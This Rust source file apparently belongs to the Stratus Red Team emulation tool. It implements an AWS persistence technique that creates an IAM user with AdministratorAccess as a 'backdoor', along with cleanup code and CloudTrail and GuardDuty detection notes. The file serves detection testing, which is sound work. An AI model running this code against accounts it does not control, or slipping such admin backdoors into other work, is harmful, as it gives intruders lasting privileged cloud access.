use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const ADMIN_POLICY_ARN: &str = "arn:aws:iam::aws:policy/AdministratorAccess";

async fn detonate_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let user_name = format!("stratus-red-team-{}", uuid::Uuid::new_v4().simple());

    let create_result = aws.iam
        .create_user()
        .user_name(&user_name)
        .tags(
            aws_sdk_iam::types::Tag::builder()
                .key("StratusRedTeam")
                .value("true")
                .build()
                .map_err(|e| anyhow::anyhow!("{}", e))?,
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let user_arn = create_result
        .user()
        .map(|u| u.arn().to_string())
        .unwrap_or_else(|| format!("unknown ARN for {}", user_name));

    aws.iam
        .attach_user_policy()
        .user_name(&user_name)
        .policy_arn(ADMIN_POLICY_ARN)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Created backdoor admin IAM user: {} (ARN: {})", user_name, user_arn);

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;

    // List users with StratusRedTeam tag prefix
    let list_result = aws.iam
        .list_users()
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    for user in list_result.users() {
        if !user.user_name().starts_with("stratus-red-team-") {
            continue;
        }

        let user_name = user.user_name();

        // Detach all policies
        let policies_result = aws.iam
            .list_attached_user_policies()
            .user_name(user_name)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("{}", e))?;

        for policy in policies_result.attached_policies() {
            let detach = aws.iam
                .detach_user_policy()
                .user_name(user_name)
                .policy_arn(policy.policy_arn().unwrap_or(""))
                .send()
                .await;

            match detach {
                Err(e) => {
                    let msg = format!("{}", e);
                    if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                        // ignore
                    } else {
                        return Err(anyhow::anyhow!("{}", e));
                    }
                }
                Ok(_) => {}
            }
        }

        // Delete the user
        let del = aws.iam
            .delete_user()
            .user_name(user_name)
            .send()
            .await;

        match del {
            Err(e) => {
                let msg = format!("{}", e);
                if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                    // ignore
                } else {
                    return Err(anyhow::anyhow!("{}", e));
                }
            }
            Ok(_) => {
                println!("Deleted backdoor admin user: {}", user_name);
            }
        }
    }

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.iam-create-admin-user",
        friendly_name: "Create Admin IAM User",
        description: "Creates a new IAM user with administrative privileges as a persistence backdoor.",
        detection: "CloudTrail: CreateUser, AttachUserPolicy. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
